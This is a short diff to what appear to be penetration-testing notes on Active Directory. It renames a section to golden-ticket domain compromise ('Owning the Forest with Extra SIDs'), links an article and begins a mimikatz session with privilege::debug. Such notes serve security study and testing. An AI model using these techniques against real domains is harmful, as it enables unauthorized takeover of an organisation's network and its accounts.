@@ -403,8 +403,11 @@ SamAccountName    : Enterprise Admins
 SID               : S-1-5-21-1255581842-1300659601-3764024703-519
 ```
 
-##### Exploiting Domain Trusts
-https://blog.netwrix.com/2022/08/31/complete-domain-compromise-with-golden-tickets/
+##### Domain Compromise by golden-tickets-attack
+* AKA Owning the Forest with Extra SIDs
+* https://blog.netwrix.com/2022/08/31/complete-domain-compromise-with-golden-tickets/
+
+  Alternative way would be exploiting the printer
 ```powershell
 mimikatz # privilege::debug
 Privilege '20' OK
